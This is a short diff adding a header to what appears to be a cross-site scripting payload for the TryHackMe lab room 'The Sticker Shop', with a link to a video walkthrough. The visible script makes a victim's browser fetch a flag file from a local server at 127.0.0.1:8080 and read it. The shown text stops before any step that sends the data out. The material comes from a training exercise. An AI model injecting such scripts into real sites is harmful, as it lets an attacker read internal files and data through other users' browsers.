@@ -1,3 +1,6 @@
+Payload used on TryHackMe room The Sticker Shop https://tryhackme.com/r/room/thestickershop
+YouTube video walk through: https://youtu.be/lB68TvzPEHI
+
 <script>
 fetch('http://127.0.0.1:8080/flag.txt')
   .then(response => response.text())
